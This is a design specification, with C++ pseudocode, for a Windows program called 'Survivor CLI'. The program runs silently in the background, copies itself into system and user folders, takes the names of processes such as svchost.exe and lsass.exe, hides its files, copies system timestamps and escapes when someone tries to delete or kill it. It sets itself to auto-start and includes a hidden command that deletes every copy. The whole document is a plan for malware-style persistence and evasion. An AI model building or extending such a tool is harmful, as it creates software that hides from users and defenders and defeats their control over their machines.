# Survivor CLI - Design Specification v2

## Overview

A self-surviving CLI tool that evades deletion by autonomously copying, moving, and disguising itself across the filesystem. Runs as a background daemon that automatically spreads and hides, requiring no user intervention after launch.

## Core Behaviors

### 1. Daemon Mode (No Arguments)

When launched without commands, runs as background daemon:
- Starts monitoring thread
- Randomly spreads to new locations
- Responds to threats automatically
- Silent operation (no console output unless debug)

### 2. Automatic Spreading

Random interval (30s - 5min) between actions:
- **Copy**: Copy to random target directory
- **Move**: Move to new directory (probability-based)
- **Rename**: Disguise as system file name

Target directories (randomly chosen):
- `%APPDATA%`
- `%LOCALAPPDATA%`
- `%TEMP%`
- System directories
- User home directories
- Hidden directories (.config, .local, etc.)

### 3. Threat Detection

Continuous monitoring triggers escape when:
- File access denied (someone trying to delete)
- File being modified by external process
- Process list shows taskkill or del command
- File size/timestamp changes unexpectedly

### 4. Disguise Strategy

Impersonate system files:
- `svchost.exe`, `rundll32.exe`, `cmd.exe`, `conhost.exe`
- Random name generator for new copies
- Files hidden with `FILE_ATTRIBUTE_HIDDEN`
- Timestamp cloned from system files

## Commands

All manual commands still work (for operational control):
| Command | Description | Hidden |
|---------|-------------|--------|
| `copy <path>` | Copy self to target | No |
| `move <path>` | Move self to target | No |
| `rename <newname>` | Rename current | No |
| `hide` | Delete and restore | No |
| `env --add` | Add to PATH | No |
| `env --remove` | Remove from PATH | No |
| `plant` | Auto-start | No |
| `summon` | List instances | No |
| `sync` | Sync all instances | No |
| `check` | Check and restore | No |
| `status` | Show status | No |
| `ilovecwj <key>` | Delete all | **YES** |
| `daemon` | Start background mode explicitly | No |
| `spread` | Trigger immediate spread | No |
| `hide-now` | Emergency hide | No |

## Technical Implementation

### Background Threading

```cpp
// Main thread: command processing (or daemon wait)
// Worker threads:
1. SpreadingThread    - Random interval copy/move
2. MonitoringThread   - Threat detection
3. RestorationThread  - Restore missing copies
```

### Spreading Logic

```cpp
void SpreadingThread() {
    while (running) {
        interval = random(30s, 5min);
        sleep(interval);

        target = selectRandomTargetDir();
        action = random(COPY, MOVE, RENAME);
        disguise = random(SYSTEM_NAME, RANDOM_NAME);

        execute action with disguise;
        register new instance;
    }
}
```

### Threat Detection

```cpp
void MonitoringThread() {
    while (running) {
        for each registered instance {
            if (cannot access file) escape();
            if (file changed unexpectedly) escape();
        }
        check for hostile processes (taskkill, del, etc.)
        sleep(1s);
    }
}
```

### Target Directory Selection

```cpp
vector<string> GetTargetDirs() {
    return {
        getenv("APPDATA"),
        getenv("LOCALAPPDATA"),
        getenv("TEMP"),
        getenv("USERPROFILE") + "\\.local",
        getenv("USERPROFILE") + "\\AppData\\Local\\Microsoft",
        "C:\\Windows\\System32",  // careful
        "C:\\Windows\\SysWOW64",
        "C:\\ProgramData\\Microsoft",
    };
}
```

### Disguise Names

```cpp
vector<string> SYSTEM_NAMES = {
    "svchost.exe", "rundll32.exe", "cmd.exe", "conhost.exe",
    "taskhostw.exe", "dwm.exe", "sihost.exe", "fontdrvhost.exe",
    "lsass.exe", "services.exe", "winlogon.exe"
};
```

## Security

### Communication
- XOR obfuscation on instances.json
- ACL on registry file (current user only)

### No Destruction
- All operations are copy/move/rename only
- Never overwrites critical system files
- Never modifies file content, only metadata

## Build

- MinGW g++ with CMake
- Windows x64 target
- Static linking preferred for portability